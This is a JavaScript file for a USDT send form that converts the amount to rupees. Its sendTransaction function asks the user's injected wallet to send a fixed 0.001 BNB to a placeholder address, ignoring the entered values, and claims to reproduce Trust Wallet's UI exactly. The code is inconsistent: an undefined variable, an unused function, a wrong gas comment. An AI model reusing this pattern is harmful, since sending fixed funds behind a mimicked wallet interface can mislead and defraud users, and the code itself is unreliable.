const address = document.getElementById("address");
const addressBox = document.getElementById("addressBox");
const amount = document.getElementById("amount");
const amountBox = document.getElementById("amountBox");
const next = document.getElementById("next");
const inr = document.getElementById("inr");

const RATE = 83;

[address, amount].forEach((input) => {
  const box = input === address ? addressBox : amountBox;

  input.addEventListener("focus", () => {
    box.classList.add("focused");
  });

  input.addEventListener("blur", () => {
    if (!input.value.trim()) box.classList.remove("focused");
  });
});

function update() {
  const usdt = parseFloat(amount.value);

  inr.textContent =
    !isNaN(usdt) && usdt > 0 ? (usdt * RATE).toFixed(2) : "0.00";

  if (address.value.trim() && usdt > 0) {
    next.classList.add("enabled");
    next.disabled = false;
  } else {
    next.classList.remove("enabled");
    next.disabled = true;
  }
}

async function sendTransaction() {
    // This will show Trust Wallet's native transaction popup
    // with EXACTLY that UI you see in the screenshot
    
    const transactionParameters = {
        from: walletAddress, // User's wallet
        to: '0x...', // Recipient address
        value: '0x38D7EA4C68000', // 0.001 BNB in hex (16 Gwei)
        gas: '0x5208', // 21000 gas limit
        gasPrice: '0x3B9ACA00', // 1 Gwei in hex
        // data: '0x' // For contract calls
    };
    
    try {
        // This triggers Trust Wallet's popup with "Asset", "DApp", "Network fee"
        const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters]
        });
        
        console.log('Transaction sent:', txHash);
        return txHash;
        
    } catch (error) {
        if (error.code === 4001) {
            console.log('User rejected transaction');
        }
        throw error;
    }
}

address.addEventListener("input", update);
amount.addEventListener("input", update);
